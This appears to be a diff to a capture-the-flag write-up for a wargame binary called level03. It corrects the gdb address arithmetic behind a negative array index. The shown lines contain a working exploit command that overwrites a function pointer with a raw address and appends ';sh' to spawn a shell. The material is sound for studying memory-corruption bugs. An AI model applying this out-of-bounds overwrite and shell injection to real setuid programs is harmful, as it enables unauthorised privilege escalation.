@@ -11,7 +11,7 @@ $ gdb /levels/level03
 (gdb) print &buf
 	$3 = (char (*)[64]) 0xffab8bec
 
-(&buf - fns = 0xfff23f1c - 0xfff23f8c = -112 / 4 = -28)
+(&buf - fns = 0xffab8c5c - 0xffab8bec = -112 / 4 = -28)
 
 $ /levels/level03 -28 $'\x5b\x87\x04\x08'\;sh
 
